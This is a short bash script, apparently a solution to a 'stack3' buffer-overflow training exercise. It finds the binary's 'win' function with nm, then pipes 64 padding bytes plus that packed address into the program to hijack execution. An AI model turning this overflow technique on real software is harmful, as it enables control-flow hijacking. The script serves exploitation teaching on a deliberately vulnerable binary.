#!/usr/bin/env bash
python -c "import sys; import struct; print 'A'*64 + struct.pack('<I', int(sys.argv[1], 0))" `nm ../stack3/stack3 | grep win | cut -d " " -f 1 | xargs printf "0x%s\n"` | ../stack3/stack3
